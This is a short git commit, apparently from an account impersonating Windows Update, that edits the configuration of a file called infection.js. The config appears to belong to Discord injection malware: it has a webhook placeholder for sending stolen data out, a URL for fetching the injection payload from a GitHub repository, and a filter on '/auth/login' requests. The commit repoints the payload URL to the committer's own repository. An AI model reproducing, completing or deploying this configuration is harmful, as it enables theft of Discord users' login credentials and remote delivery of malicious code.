80804927847b8dc2ff3699ba361a439321fb8323
Windows <147253087+WindowsUpdateComponents@users.noreply.github.com>
2026-09-05 07:03:14 -0700

    Update infection.js

--- infection.js
+++ infection.js
@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/WindowsUpdateComponents/Archives/refs/heads/main/infection.js",
     filters: {
         urls: [
             '/auth/login',
